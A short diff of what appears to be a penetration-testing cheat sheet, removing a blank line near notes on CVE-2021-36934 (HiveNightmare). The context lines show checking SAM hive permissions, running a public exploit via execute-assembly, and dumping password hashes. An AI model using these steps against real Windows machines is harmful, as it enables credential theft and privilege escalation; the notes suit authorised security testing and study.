@@ -108,7 +108,6 @@ run icacls C:\Windows\System32\config\SAM
 # Exploit: Csharp implementation [HERE](https://github.com/cube0x0/CVE-2021-36934)
 execute-assembly C:\CVE-2021-36934.exe
 --> Dumps hashes to console upon successful exploitation
-
 ```
 
 ------------------------------------------------------------------------------------------
